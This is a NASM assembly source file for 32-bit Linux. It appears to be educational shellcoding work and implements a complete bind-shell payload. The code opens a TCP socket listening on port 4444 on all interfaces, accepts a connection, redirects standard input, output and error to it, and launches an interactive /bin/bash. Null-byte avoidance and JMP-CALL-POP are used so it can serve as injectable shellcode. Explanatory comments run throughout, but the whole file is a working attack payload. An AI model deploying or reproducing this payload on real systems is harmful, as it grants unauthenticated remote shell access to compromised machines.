;--------------------------------------------------------------
;
; ch06-bindshell32.nasm
; by Michael Born (@blu3gl0w13)
; Date: 2019
; 
;---------------------------------------------------------------------------

global _start

section .text

_start:

	; This block sets up our socket EAX will contain the
	; return value. We'll need to use this value later

	xor eax, eax		; clean up eax to eliminate NULL bytes
	xor ebx, ebx		; clean up ebx to eliminate NULL bytes
	xor ecx, ecx		; clean up ecx to eliminate NULL bytes
	push 0x6		; 3rd parameter TCP protocol to SYS_SOCKET
	push 0x1		; 2nd parameter SOCK_STREAM to SYS_SOCKET
	push 0x2		; 1st parameter AF_INET
	mov al, 0x66 		; define __NR_socketcall  102 (0x66)
	mov bl, 0x1		; define SYS_SOCKET   1 (0x1)
	mov ecx, esp		; ecx now contains address to top of stack for parameters
	int 0x80		; execute

	mov edi, eax	; store our return value for later



jump_short:


	; JMP CALL POP technique for port should do nicely
	
	jmp short portconfig


call_bind:

	; get the port off of stack and store it temporarily
	; there is some interesting referencing here for
	;
	; int bind(int sockfd, const struct sockaddr *addr,
        ;        socklen_t addrlen)
	; need to handle the struct *addr
	; struct sockaddr {
        ;       sa_family_t sa_family;
        ;       char        sa_data[14];
        ;   }

	pop esi			; this should be our listening port JMP/CALL/POP
	xor eax, eax		; clean out eax
	xor ebx, ebx		; clean out ebx
	xor ecx, ecx		; clean out ecx
	xor edx, edx		; clean out edx
	push eax		; we'll need to listen on 0.0.0.0
	push word [esi]		; port pushed onto stack make sure to ONLY push 2 bytes
	mov al, 0x2		; AF_INET IPv4 Internet protocols
	push ax			; now our stack is set up
	mov edx, esp		; store the stack address (of our struct)
	push 0x10		; store length addr on stack
	push edx		; now we need to push the pointer to our struct onto stack
	push edi		; here's our returned socketfd from our SOCKET only 1 byte
	xor eax, eax		; clean out eax again
	mov al, 0x66		; define __NR_socketcall  102 (0x66)
	mov bl, 0x2		; define SYS_BIND  2 (0x2)
	mov ecx, esp		; parameters for bind, ecx should already be cleaned out
	int 0x80		; call it, 0 will be returned on success

listener:

	; now we need to listen for connections
	;
	; int listen(int sockfd, int backlog);
	;
	; good thing we didn't get rid of edi
	; since we'll need it here and 
	; for accept()

	xor eax, eax		; clean out eax
	xor ebx, ebx		; clean out ebx
	xor ecx, ecx		; clean out ecx
	push 0x1		; int backlog
	push edi		; int sockfd only a byte
	mov al, 0x66		; define __NR_socketcall  102 (0x66)
	mov bl, 0x4		; define SYS_LISTEN  4
	mov ecx, esp		; parameters into ecx
	int 0x80		; call it

accept_connect:


	; now we accept connections
	; in this case we can use NULL
	; values for addr. We'll have to
	; we can be a bit lazier with this one
	;
	; int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	;
	;
	; The argument addr is a pointer to a sockaddr structure.  
	; This structure is filled in with the address of the peer 
	; socket, as known to the communications layer.  The exact 
	; format of the address returned addr is determined by the 
	; socket's address family (see socket(2) and the respective 
	; protocol man pages).  When addr is NULL, nothing is filled 
	; in. In this case, addrlen is  not  used, and should also be NULL.
	;

	xor eax, eax		; clean eax
	xor ebx, ebx		; clean ebx
	push eax		; set up null space addrlen
	push ebx		; setup more nullspace for addr
	push edi		; socketfd
	mov al, 0x66		; define __NR_socketcall  102 (0x66)
	mov bl, 0x5		; define SYS_ACCEPT 5 
	mov ecx, esp		; parameters to define SYS_ACCEPT
	int 0x80		; call it, eax will hold the new fd


change_fd:

	; changes std in, out, error to the socket
	; this is necessary for getting /bin/bash
	; through the socket connection
	;
	; we'll use define __NR_dup2	63 (0x3f)
	;
	; int dup2(int oldfd, int newfd)
	;

	mov ebx, eax		; take fd from accept() as oldfd
	xor ecx, ecx		; 0 (std in) in ecx
	xor eax, eax		; clean out eax
	mov al, 0x3f		; define __NR_dup2    63 (0x3f)	
	int 0x80		; call it
	mov al, 0x3f		; dup2
	inc ecx			; 1 (std out) in cl
	int 0x80		; call it
	mov al, 0x3f		; dup2
	inc ecx			; 2 (std error) in cl
	int 0x80		; call it

shell_exec:

	; now it's time to launch our shell
	; program using execve. I prefer
	; /bin/bash we'll use /bin////bash
	; execve is 0xb (11)
	; int execve(const char *filename, char *const argv[],
        ;          char *const envp[])


	xor eax, eax		; clean out eax
	push eax		; need a null byte for execve parameters
	push 0x68736162		; hsab
	push 0x2f2f2f2f		; ////
	push 0x6e69622f		; nib/ 
	mov ebx, esp		; save stack pointer in ebx
	push eax		; Null onto stack
	push word 0x692d	; "-i" parameter to /bin/bash
	mov esi, esp		; save the argument pointer 
	push eax		; null byte terminator
	push esi		; pointer to "-i" parameter to /bin/bash
	push ebx		; points to 0x00hsab////nib/
	mov ecx, esp		; store pointer to 0x00hsab////nib/ into ecx
	xor edx, edx		; NULL as last parameter
	mov al, 0xb		; execve
	int 0x80		; call it
	
	


portconfig:

	call call_bind
	portnum dw 0x5c11	; port 4444 (0x115c) don't forget little endian
